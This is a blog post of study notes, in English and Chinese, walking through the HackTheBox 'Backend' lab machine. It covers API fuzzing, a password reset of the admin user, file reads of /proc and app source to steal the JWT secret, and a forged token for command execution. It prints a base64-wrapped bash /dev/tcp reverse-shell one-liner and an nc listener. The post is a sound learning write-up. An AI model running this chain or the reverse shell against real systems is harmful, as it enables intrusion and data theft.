---
title: '[HTB]Backend - API'
date: 2022-04-17 14:19:16
tags: [HTB,API,笔记]
published: true
hideInList: false
feature: 
isTop: false
---
# Backend - API

突然想做这个box的起因是看到一条tweet，qwq 原来做box这么有用的嘛

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled.png20220417a.png)

learn from IppSec Video：

[HackTheBox - Backend](https://www.youtube.com/watch?v=x6Kpkl0C2xg)

/b

the article：

[HTB: Backend](https://0xdf.gitlab.io/2022/04/12/htb-backend.html)

笔记基本上是看着IpSec的视频做的，给以后温习用。尝试用英文做笔记，增加自己英文写作能力。

## nmap

Start of nmap

command：

```bash
sudo nmap -sC -sV -oA nmap/backend 10.10.11.161
```

- -sC: default script
- -sV: enumerate versions
- -oA: export the scan results in all the available formats at once\

**result:**

- 22/tcp:
    - ssh
- 80/tcp
    - uvicor
    - response to us with json
    

## gobuster

Examining the webpage, just finding json. Running gobuster to discover /docs and /api

command

```bash
gobuster dir -u http://10.10.11.161 
```

**result:**

- find /api endpoint
    - endpoint: /api/v1/user
        - response status:404
    - endpoint: /api/v1/admin
        - response status:307
        

## Examing the endpoint

<aside>
💡 when endpoint with user,you can try id number

</aside>

try:

- /api/v1/user/1
- /api/v1/user/login
    - try change request methods

## API Discovery

<aside>
💡 This section IppSec talking about why API Discovery differs from normal web, instead of extensions we fuzz methods

</aside>

### gobuster

command 

```bash
gobuster dir -u http://10.10.11.161/api/v1/user -w /opt/SecList/Discovery/Web-Content/raft-small-words.txt
```

### feroxbuster

command

```bash
feroxbuster dir -u http://10.10.11.161/api/v1/user -w /opt/SecList/Discovery/Web-Content/raft-small-words.txt
```

### wfuzz

command

```bash
wfuzz -X POST -w /opt/SecList/Discovery/Web-Content/common.txt  http://10.10.11.161/api/v1/user/FUZZ
```

hide 404 and 405 status code

```bash
wfuzz -X POST -w /opt/SecList/Discovery/Web-Content/common.txt  http://10.10.11.161/api/v1/user/FUZZ --hc 404,405
```

## Fuzzing signup

使用 `wfuzz` 检测出api存在signup结点

这里使用burpsuite做测试

## Curl behaves&****troubleshoot****

<aside>
💡 Showing that curl behaves differently. Lets troubleshoot this by sending our curl and burpsuite to wireshark and seeing why its behaving differently

</aside>

Using below command,and you find response is different from burpsuite

```bash
curl -X POST  http://10.10.11.161/api/v1/signup -d 'user=ipp' | jq .
```

even you add `Content-Type` header,the response is stiil different from burpsuite

```bash
curl -X POST  http://10.10.11.161/api/v1/signup -H 'Content-Type: application/json' -d 'user=ipp' | jq .
```

so，the next we use wireshark to capture the package，and find the reason

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%201.png20220417a.png)

find curl could magic add something

## Attemping to login with our credential

需要修改一下header(非json格式）

```bash
Content-Type: application/x-www-form-urlencoded
```

返回了token

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%202.png20220417a.png)

`access_token` 的值为jwt token

## Accessing /docs endpoint

 In above section,we get jwt token and next we use it to /docs endpoint

add header: `Authorization:bearer` 

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%203.png20220417a.png)

and send this request,we find application make a new request to /openapi endpoint.and now **we have the documentation of the api**

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%204.png20220417a.png)

You can find there’s nothing just defined for just /user( /api/v1/user endpoint),but admin is different,there’s /api/v1/admin endpoint

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%205.png20220417a.png)

## Authenticating in the swagger 

虽然admin没有权限，但是你可以点这个 🔒 的图标去登陆备

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%206.png20220417a.png)

然后，但是这样创建的用户也不是管理员

but after login the user what we created, we don’t have the authentical to /admin

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%207.png20220417a.png)

you can use `/user/{user-id}` to get the id of ‘1’,and copy his guid

the go `/api/v1/user/updatepass` to update password of user 1

## Login in with admin and do something

### /api/v1/admin/file

now we can login in with admin,and then we go pass `/api/v1/admin/file`  to get `/etc/passwd` 

### /api/v1/admin/exec/{command}

<aside>
💡 You can use [jwt.io](http://jwt.io) to parse your jwt token

</aside>

we put our jwt token to [jwt.io](http://jwt.io) to parse it，and as result there’s not much information here

## Exploring the /proc/self directory with the LFI

### **`/api/v1/admin/file`**

use burpsuite to capture `/api/v1/admin/file`  ，construct the request body as this

```bash
{
	"file":"/proc/self/cmdline"
}
```

- `/proc/self/cmdline` 代表当前程序命令行参数（[https://blog.csdn.net/whatday/article/details/108897457](https://blog.csdn.net/whatday/article/details/108897457)）

### `**/proc/self/environ`**

```bash
{
	"file":"/proc/self/environ"
}
```

 

- `/proc/self/environ`  find the program’s envrionment

```bash
APP_MODULE=app.main:app...etc
PWD=/home/htb/uhc
```

### **get the .py source code**

```bash
{
	"file":"/home/htb/uhc/app/main.py"
}
```

### Copy souce code to vim

### read main.py

open vim 

- `:set paste`
- `%s/\\n/\r/g`

When you formatting your python source code,you will find  uder the  `[main.py](http://main.py)` has the line 20 ：`app.core.config import settings`

### read app.core.config

using endpoint `/api/v1/admin/file`  to read configuration file : `[config.py](http://config.py)` 

you will find `JWT_SECRET` 

### using `JWT_SECRET` to generate jwt

then go jwt.io, change the history jwt parsing result.

( `”debug”: true` 是新增的一行， `HMACSHA256` 下将 `your-256-bit-secret` 改为 `JWT_SECRET` )

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%208.png20220417a.png)

### set new jwt  to `/api/v1/admin/exec/whoami`

before you set your new jwt

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%209.png20220417a.png)

after you set your new jwt

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%2010.png20220417a.png)

## bypass slash restrict in url

<aside>
💡 Notice: you should enter more space to prevent `+` in your base64 encode string(it will influence the header’s url constructing)
but if you will urlencode all your string,it doesn’t matter

</aside>

when you try `/api/v1/admin/exec/echo%20"AB\/C"` or `/api/v1/admin/exec/echo%20"AB%2FC"` the slash will be seen as the part of url

so,you should use base64 to encode the slash

```bash
echo 'bash -i >& /dev/tcp/10.10.14.8/9001  0>&1' | base 64 -w 0
```

your local bash should use nc to listen the port

```bash
nc -lvnp 9001
```

then put the base64 encode into url and add `| base64 -d | bash`  to decode base64 and exec as bash command

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled%2011.png20220417a.png)

then urlencode all your payload and send it !

you local nc  will get shell

## getting a reverse shell

这块感觉要多学学

after nc get shell, input 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
stty raw -echo; fg
```

learn about more `stty` ： [https://man7.org/linux/man-pages/man1/stty.1.html](https://man7.org/linux/man-pages/man1/stty.1.html)

cn manual：[https://man.archlinux.org/man/stty.1.zh_TW](https://man.archlinux.org/man/stty.1.zh_TW)

## auth.log& scp

find the password。。。

and you also can paste your public key to authroized_keys file,scp the file

```bash
scp -r -i backend root@10.10.11.161:/home/htb/uhc .
```

: -r : recursive (because it is a folder)

you can also tar all the file to `bz2`